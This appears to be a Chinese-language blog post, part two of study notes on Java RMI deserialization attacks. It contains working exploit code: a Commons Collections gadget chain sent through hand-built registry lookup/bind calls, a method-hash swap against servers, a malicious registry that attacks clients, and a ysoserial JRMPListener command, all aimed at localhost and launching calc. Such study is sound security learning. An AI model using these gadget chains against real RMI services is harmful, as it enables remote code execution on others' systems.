@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            RMI反序列化学习笔记(2): 攻击实现
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/">https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/</a></p>
+<h1 id="lookup-bind-攻击注册中心"><a href="#lookup-bind-攻击注册中心" class="headerlink" title="lookup bind 攻击注册中心"></a>lookup bind 攻击注册中心</h1><p>客户端获得RegistryImpl_Stub后，调用lookup，或者bind，参数会被远程注册中心反序列化，因此可以攻击。但是lookup和bind无法传Object类型，得手动实现恶意lookup或bind方法。</p>
+<p>适用JDK版本：jdk&lt;8u121</p>
+<p>大致调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handleMessages</span><br><span class="line">    serviceCall</span><br><span class="line">		UnicastServerRef#dispatch</span><br><span class="line">			oldDispatch</span><br><span class="line">				RegistryImpl_Skel#dispatch //客户端/服务端攻击注册中心</span><br><span class="line">					case 0: // bind(String, Remote)</span><br><span class="line">					case 1: // list()</span><br><span class="line">					case 2: // lookup(String)</span><br><span class="line">						in.readObject(); // 对lookup的参数进行反序列化。客户端攻击服务端</span><br><span class="line">					case 3: // rebind(String, Remote)</span><br><span class="line">					case 4: // unbind(String)</span><br></pre></td></tr></table></figure>
+
+<p>代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class RegistryExploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line"></span><br><span class="line">        lookup(registry);</span><br><span class="line">//        bind(registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void lookup(RegistryImpl_Stub registry) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">            Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">            Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">            refField.setAccessible(true);</span><br><span class="line">            UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">            Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">            RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">            ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line"></span><br><span class="line">            var3.writeObject(genEvilMap());</span><br><span class="line">            ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void bind(RegistryImpl_Stub registry) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;);</span><br><span class="line">        refField.setAccessible(true);</span><br><span class="line">        UnicastRef ref = (UnicastRef) refField.get(registry);</span><br><span class="line"></span><br><span class="line">        Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;;</span><br><span class="line"></span><br><span class="line">        RemoteCall var3 = ref.newCall(registry, operations, 0, 4905912898345647071L);</span><br><span class="line"></span><br><span class="line">        ObjectOutput var4 = var3.getOutputStream();</span><br><span class="line">        var4.writeObject(&quot;test&quot;);</span><br><span class="line">        var4.writeObject(genEvilMap());</span><br><span class="line"></span><br><span class="line">        ref.invoke(var3);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static HashMap genEvilMap() throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, &quot;bbb&quot;);</span><br><span class="line">        lazyMap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return map2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参数-method-hash-攻击服务端"><a href="#参数-method-hash-攻击服务端" class="headerlink" title="参数 method hash 攻击服务端"></a>参数 method hash 攻击服务端</h1><p>正常情况下，client和server的远程对象接口的方法参数是相同的。假如server的方法参数为String，而client的方法参数为Object，client调用方法发送参数能否正常被server反序列化？</p>
+<p>分别用idea打开两个相同的demo，一个做client，一个做server。主要修改接口的方法参数，其他位置不变。</p>
+<p>client的IRemoteObj的参数改为Object。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface IRemoteObj extends Remote &#123;</span><br><span class="line">    public Object sayhello1(Object key) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>server的IRemoteObj的sayhello1的参数为String。</p>
+<p>测试对象Bean，这个类在server和client都有。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Bean implements Serializable&#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    public Bean(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        System.out.println(&quot;bean: readObject&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动server，然后client调用sayhello1，传Bean对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry r= LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,7788);</span><br><span class="line">IRemoteObj remoteObj= (IRemoteObj) r.lookup(&quot;remoteobj&quot;);</span><br><span class="line">remoteObj.sayhello1(new Bean(&quot;client Bean&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>直接运行会报错：<code>Caused by: java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:294)</code>。</p>
+<p>大致意思就是UnicastServerRef保存了一个Map，这个Map保存了方法hash与方法的对应关系。方法hash的计算和参数类型有关。</p>
+<p>那现在就要知道：哪里计算了hash，或者哪里保存了hash，或者哪里发送了hash。</p>
+<p>断点打在：UnicastRef#invoke</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(2)/RMI(2" alt="RMI(2"></p>
+<p>向上溯源</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(2)/RMI(2" alt="RMI(2"></p>
+<p>果然是在这里发送了。</p>
+<p>跟进new StreamRemoteCall</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(2)/RMI(2" alt="RMI(2"></p>
+<p>把hash写进了流。那么UnicastServerRef中则通过readLong获取hash。</p>
+<p>在UnicastServerRef的dispatch中，可以看见hash被读出。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(2)/RMI(2" alt="RMI(2"></p>
+<p>那么client调用方法时，参数还是Object，但是发送一个String参数的hash过去，server不就能反序列化了吗？</p>
+<p>实际操作可以想到用Agent修改getMethodHash方法，使之恒返回String参数的方法的hash。这里为了方便测试，直接用debug自带的setValue。</p>
+<p>首先client的IRemoteObj的方法参数改为String，然后断点打在<code>UnicastRef#invoke</code>，拿到方法的hash，我拿到的是<code>7875784002914950643</code>，我没研究过算法，读者若测试可能计算得不同。</p>
+<p>然后方法参数改回Object，传一个Bean，执行到<code>var7 = new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);</code>时，把var4改为上面的hash，然后发送。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(2)/RMI(2" alt="RMI(2"></p>
+<p>然后异常就是<code>Exception in thread &quot;main&quot; java.lang.IllegalArgumentException: argument type mismatch</code>。</p>
+<p>查看server的console，成功执行Bean的readObject。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/RMI(2)/RMI(2" alt="RMI(2"></p>
+<h1 id="注册中心bind攻击客户端"><a href="#注册中心bind攻击客户端" class="headerlink" title="注册中心bind攻击客户端"></a>注册中心bind攻击客户端</h1><p>在server中bind的对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry r= LocateRegistry.createRegistry(7788);</span><br><span class="line">r.bind(&quot;remoteobj&quot;,remoteObj);</span><br></pre></td></tr></table></figure>
+
+<p>在client中lookup的对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry r= LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,7788);</span><br><span class="line">IRemoteObj remoteObj= (IRemoteObj) r.lookup(&quot;remoteobj&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这两个对象是同一个。</p>
+<p>若server中bind一个恶意对象，那么client lookup时候就会readObject，导致被攻击。</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class EvilRegistry &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RemoteObjImpl();</span><br><span class="line">        Remote remoteObj = new RemoteWrapper();</span><br><span class="line">        Registry r = LocateRegistry.createRegistry(1099);</span><br><span class="line">        r.bind(&quot;remoteObj&quot;,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RemoteWrapper implements Remote, Serializable &#123;</span><br><span class="line">    private Map map;</span><br><span class="line"></span><br><span class="line">    RemoteWrapper() throws Exception &#123;</span><br><span class="line">        this.map = genEvilMap();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为bind需要Remote对象，所以封装了一个类。这里虽然客户端上没有这个Wrapper类，但反序列化是从里往外的，在报错之前里面的恶意Map已经反序列化完成了。另外如果不发布一个真的远程对象程序就直接运行结束了，所以new了一个RemoteObjImpl。除此之外还可以用sleep。</p>
+<p>相关调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RegistryImpl_Stub#lookup</span><br><span class="line">	UnicastRef#newCall</span><br><span class="line">	</span><br><span class="line">	UnicastRef#invoke</span><br><span class="line">		StreamRemoteCall#executeCall</span><br><span class="line">			DataInputStream rd = new DataInputStream(conn.getInputStream());//和注册中心通信，获取stub的原始数		</span><br><span class="line">	readObject //反序列化得到stub，注册中心攻击客户端</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="方法返回值-攻击客户端"><a href="#方法返回值-攻击客户端" class="headerlink" title="方法返回值 攻击客户端"></a>方法返回值 攻击客户端</h1><p>道理很简单，远程方法执行结束后返回值会被客户端反序列化。</p>
+<p>具体调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RemoteObjectInvocationHandler#invoke</span><br><span class="line">	invokeRemoteMethod</span><br><span class="line">		UnicastRef#invoke</span><br><span class="line">			var7 = new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);</span><br><span class="line">			var7.executeCall();</span><br><span class="line">			unmarshalValue	//这个方法是用来判断值类型的。</span><br><span class="line">				readObject() //若类型不是基础类型，则对远程方法的返回值readObject。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="异常-攻击客户端"><a href="#异常-攻击客户端" class="headerlink" title="异常 攻击客户端"></a>异常 攻击客户端</h1><p>客户端请求服务端，服务端返回一个异常，把payload装异常里，就会被客户端反序列化。</p>
+<p>对应的调用栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UnicastRef#invoke</span><br><span class="line">    StreamRemoteCall#executeCall</span><br><span class="line">        DataInputStream rd = new DataInputStream(conn.getInputStream());</span><br><span class="line">        </span><br><span class="line">    	case TransportConstants.ExceptionalReturn:in.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后客户端只要调用任意一个stub，触发UnicastRef#invoke就会被攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br><span class="line">IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#lookup-bind-%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-text">lookup bind 攻击注册中心</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E6%95%B0-method-hash-%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">参数 method hash 攻击服务端</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83bind%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">注册中心bind攻击客户端</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E8%BF%94%E5%9B%9E%E5%80%BC-%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">方法返回值 攻击客户端</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8-%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">异常 攻击客户端</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
